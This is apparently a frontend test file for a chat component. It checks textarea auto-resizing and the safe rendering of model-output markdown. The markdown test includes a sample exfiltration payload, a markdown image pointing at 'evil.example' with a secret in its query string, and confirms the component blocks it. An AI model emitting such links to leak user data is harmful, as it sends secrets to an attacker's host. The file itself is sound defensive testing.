// @vitest-environment jsdom
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { cleanup, render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { Chat } from './Chat';

const LINE = 21;
const PADDING = 20;

beforeEach(() => {
  Element.prototype.scrollIntoView = vi.fn();
  // jsdom has no layout: report a content height proportional to the number of lines.
  Object.defineProperty(HTMLTextAreaElement.prototype, 'scrollHeight', {
    configurable: true,
    get(this: HTMLTextAreaElement) {
      return this.value.split('\n').length * LINE + PADDING;
    },
  });
});

afterEach(() => {
  cleanup();
  Reflect.deleteProperty(HTMLTextAreaElement.prototype, 'scrollHeight');
});

describe('Chat composer', () => {
  it('grows with multi-line input and shrinks back when cleared', async () => {
    render(<Chat sessionId="s1" initialMessages={[]} provider="openai" model="gpt-5-mini" onTurnEnd={() => {}} />);
    const box = screen.getByPlaceholderText(/Message the agent/) as HTMLTextAreaElement;
    expect(box.rows).toBe(1);
    expect(box.style.height).toBe(`${LINE + PADDING}px`);

    await userEvent.type(box, 'one{Shift>}{Enter}{/Shift}two{Shift>}{Enter}{/Shift}three');
    expect(box.value).toBe('one\ntwo\nthree');
    expect(box.style.height).toBe(`${3 * LINE + PADDING}px`);

    await userEvent.clear(box);
    expect(box.style.height).toBe(`${LINE + PADDING}px`);
  });
});

describe('Chat markdown', () => {
  it('never renders remote images from model output, and links leak no referrer', () => {
    const reply = {
      id: 'a1', seq: 1, role: 'assistant' as const, compacted: false, createdAt: 'x',
      parts: [{ type: 'text' as const, text: '![logo](https://evil.example/x.png?d=secret) see [docs](https://example.com)' }],
    };
    const { container } = render(<Chat sessionId="s1" initialMessages={[reply]} provider="openai" model="gpt-5-mini" onTurnEnd={() => {}} />);
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText('[image: logo]')).toBeTruthy();
    const link = screen.getByRole('link', { name: 'docs' });
    expect(link.getAttribute('rel')).toBe('noopener noreferrer');
    expect(link.getAttribute('target')).toBe('_blank');
  });
});
